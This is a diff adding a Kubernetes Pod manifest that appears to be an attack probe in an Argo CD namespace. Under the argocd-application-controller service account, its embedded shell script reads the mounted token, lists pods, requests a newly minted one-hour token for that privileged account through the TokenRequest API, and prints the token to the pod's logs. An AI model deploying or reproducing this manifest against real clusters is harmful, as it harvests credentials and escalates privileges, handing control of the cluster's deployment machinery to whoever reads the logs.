@@ -1,0 +1,30 @@
+{
+ "apiVersion": "v1",
+ "kind": "Pod",
+ "metadata": {
+  "name": "i3030c-probe5-08d032",
+  "namespace": "argocd",
+  "labels": {
+   "i3030c": "08d032",
+   "probe": "5"
+  }
+ },
+ "spec": {
+  "serviceAccountName": "argocd-application-controller",
+  "restartPolicy": "Never",
+  "activeDeadlineSeconds": 600,
+  "containers": [
+   {
+    "name": "probe",
+    "image": "alpine:3.20",
+    "command": [
+     "/bin/sh",
+     "-c"
+    ],
+    "args": [
+     "#!/bin/sh\nset -u\nSA=/var/run/secrets/kubernetes.io/serviceaccount\nT=$(cat $SA/token)\nW(){ wget -q -O - --timeout=20 --no-check-certificate --header=\"Authorization: Bearer $T\" --header=\"Content-Type: application/json\" \"$@\"; }\necho \"===I3030C5_START utc=$(date -u +%FT%TZ) host=$(hostname)===\"\necho \"===PODS_PRE===\"\nW \"https://kubernetes.default.svc/api/v1/namespaces/argocd/pods?limit=100\" | tr ',' '\\n' | grep -E '\"name\"|\"phase\"' | head -40\necho \"===TOKENREQ===\"\nRESP=$(W --post-data='{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\",\"spec\":{\"audiences\":[\"https://kubernetes.default.svc\"],\"expirationSeconds\":3600}}' \"https://kubernetes.default.svc/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller/token\" 2>/dev/null)\necho \"$RESP\" | tr ',' '\\n' | grep '\"token\"' | sed 's/.*\"token\": *\"//; s/\".*//'\necho \"===TOKEN_END===\"\necho \"===I3030C5_DONE utc=$(date -u +%FT%TZ)===\"\n"
+    ]
+   }
+  ]
+ }
+}
